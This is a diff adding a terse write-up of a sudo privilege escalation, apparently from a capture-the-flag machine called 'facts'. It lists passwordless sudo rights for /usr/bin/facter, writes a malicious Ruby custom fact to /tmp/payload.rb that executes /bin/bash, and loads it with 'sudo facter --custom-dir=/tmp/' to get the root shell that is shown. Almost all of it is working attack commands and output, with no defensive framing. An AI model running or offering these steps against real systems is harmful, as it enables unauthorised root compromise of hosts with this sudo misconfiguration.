@@ -1,0 +1,30 @@
+########## FIND SUDO BINARIES THAT THE USER CAN RUN W/O PASSWORD ##########
+$> sudo -l
+
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+
+
+$> ls -l /usr/bin/facter
+
+-rwxr-xr-x 1 root root 249 Nov 26  2024 /usr/bin/facter
+
+
+########## CREATE MALICIOUS RUBY LIBRARY TO LOAD ##########
+$> vim /tmp/payload.rb    # Write the following Ruby script
+
+Facter.add(:bash) do
+  setcode do
+    exec("/bin/bash")
+  end
+end
+
+
+########## TRIGGER EXECUTION BY ADDING "/tmp/" PATH TO FACTERLIB
+$> sudo /usr/bin/facter --custom-dir=/tmp/ bash
+
+root@facts:/tmp/#
+
